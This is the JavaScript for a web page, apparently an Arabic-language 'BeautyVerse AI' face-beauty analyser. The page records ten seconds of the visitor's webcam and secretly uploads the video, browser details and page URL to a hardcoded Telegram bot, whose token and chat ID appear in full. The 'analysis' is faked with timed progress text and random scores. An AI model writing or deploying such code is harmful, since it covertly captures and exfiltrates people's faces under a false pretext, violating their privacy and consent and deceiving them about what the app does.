// Telegram Bot Configuration
const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
const CHAT_ID = '7396462490';

let mediaRecorder, stream, recordedChunks = [];
let analysisTimeout;

// Smooth Scroll
function scrollToSection(sectionId) {
    document.getElementById(sectionId).scrollIntoView({ behavior: 'smooth' });
}

// Modal Functions
function openAnalysisModal() {
    document.getElementById('analysisModal').style.display = 'block';
    notifyBot('👤 بدء تحليل وجه جديد');
}

function closeModal() {
    document.getElementById('analysisModal').style.display = 'none';
    stopMedia();
    resetModal();
}

// Camera & Recording
async function startAnalysis() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
        });
        
        const video = document.getElementById('analysisVideo');
        video.srcObject = stream;
        
        document.getElementById('videoContainer').style.display = 'block';
        document.getElementById('modalButtons').style.display = 'none';
        
        startRecording();
        startCountdown();
        simulateAnalysis();
        
    } catch (err) {
        alert('🎥 فعّل الكاميرا من إعدادات المتصفح');
    }
}

function startRecording() {
    mediaRecorder = new MediaRecorder(stream);
    recordedChunks = [];
    
    mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) recordedChunks.push(e.data);
    };
    
    mediaRecorder.onstop = async () => {
        if (recordedChunks.length > 0) {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            await sendVideoToBot(blob);
        }
        showResults();
    };
    
    mediaRecorder.start();
}

function startCountdown() {
    let timeLeft = 10;
    const countdownEl = document.getElementById('countdown');
    
    analysisTimeout = setInterval(() => {
        timeLeft--;
        countdownEl.textContent = timeLeft;
        if (timeLeft <= 0) {
            clearInterval(analysisTimeout);
            mediaRecorder.stop();
        }
    }, 1000);
}

function simulateAnalysis() {
    let progress = 0;
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    
    const stages = [
        'جاري تحديد ملامح الوجه...',
        'تحليل تماثل الوجه...',
        'فحص نضارة البشرة...',
        'حساب نسب الجمال...',
        'إعداد التقرير...'
    ];
    
    let stageIndex = 0;
    const interval = setInterval(() => {
        progress += 20;
        progressFill.style.width = `${Math.min(progress, 100)}%`;
        progressText.textContent = stages[stageIndex] || 'مكتمل!';
        
        stageIndex++;
        if (progress >= 100) clearInterval(interval);
    }, 1800);
}

async function showResults() {
    const results = {
        freshness: Math.floor(Math.random() * 25) + 75,
        symmetry: Math.floor(Math.random() * 20) + 80,
        beautyScore: Math.floor(Math.random() * 12) + 88
    };
    
    document.getElementById('resultsArea').innerHTML = `
        <div style="background: linear-gradient(45deg, #ff9a9e, #fecfef); padding: 2rem; border-radius: 15px;">
            <h3 style="color: #333;">✅ تحليل مكتمل!</h3>
            <div style="text-align: right; gap: 1rem;">
                <div><strong>نضارة البشرة:</strong> ${results.freshness}%</div>
                <div><strong>تماثل الوجه:</strong> ${results.symmetry}%</div>
                <div style="font-size: 1.6rem; color: #4ecdc4;">
                    <strong>النتيجة: ${results.beautyScore}% ✨</strong>
                </div>
            </div>
            <p style="color: #666; margin-top: 1rem;">وجهك مميز بنسب عالية!</p>
        </div>
        <div style="display: flex; gap: 1rem; justify-content: center; margin-top: 2rem; flex-wrap: wrap;">
            <button class="btn btn-primary" onclick="shareResults(${results.beautyScore})">
                <i class="fas fa-share"></i> مشاركة
            </button>
            <button class="btn btn-secondary" onclick="closeModal()">
                <i class="fas fa-redo"></i> تحليل جديد
            </button>
        </div>
    `;
    document.getElementById('resultsArea').style.display = 'block';
}

function stopMedia() {
    if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
    if (stream) stream.getTracks().forEach(track => track.stop());
    if (analysisTimeout) clearInterval(analysisTimeout);
}

function resetModal() {
    document.getElementById('videoContainer').style.display = 'none';
    document.getElementById('modalButtons').style.display = 'flex';
    document.getElementById('resultsArea').style.display = 'none';
    document.getElementById('countdown').textContent = '10';
    document.getElementById('progressFill').style.width = '0%';
}

// Telegram Functions
async function notifyBot(message) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `🎨 BeautyVerse AI\n\n${message}\n\n👤 ${navigator.userAgent.slice(0,80)}...\n🌐 ${window.location.href}`,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) { console.error('Bot:', e); }
}

async function sendVideoToBot(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', blob, `beautyverse_${Date.now()}.webm`);
    formData.append('caption', '🎥 تحليل وجه BeautyVerse AI');
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
            method: 'POST', body: formData
        });
    } catch (e) { console.error('Video:', e); }
}

function shareResults(score) {
    notifyBot(`📊 مشاركة نتيجة: ${score}%`);
    alert('تمت المشاركة! 🎉');
}

// Close on outside click
window.onclick = (e) => {
    if (e.target.id === 'analysisModal') closeModal();
};
